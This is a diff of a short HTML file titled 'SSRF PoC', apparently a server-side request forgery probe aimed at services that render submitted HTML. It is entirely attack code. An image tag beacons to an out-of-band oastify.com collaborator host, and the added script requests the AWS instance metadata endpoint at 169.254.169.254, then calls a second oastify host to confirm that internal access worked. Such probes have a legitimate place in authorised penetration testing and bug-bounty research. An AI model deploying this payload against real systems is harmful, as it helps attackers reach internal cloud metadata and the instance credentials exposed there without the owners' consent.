@@ -1,15 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SSRF PoC</title>
 </head>
+
 <body>
     <h1>Hello</h1>
     <img src="https://x86ojc0173jpdehgt6rrn0do9ff63xrm.oastify.com/?ItsRenderingHtml">
     <script>
-        fetch('https://x86ojc0173jpdehgt6rrn0do9ff63xrm.oastify.com/?JavacriptIsExcuted=');
+        fetch("http://169.254.169.254/latest/meta-data/", {
+            method: "GET"
+        }).then(() => fetch('https://t5zkg8xx4zglaaecq2onkwak6bc20uoj.oastify.com/?awsMetaAccessed')).catch(() => { });
     </script>
 </body>
+
 </html>
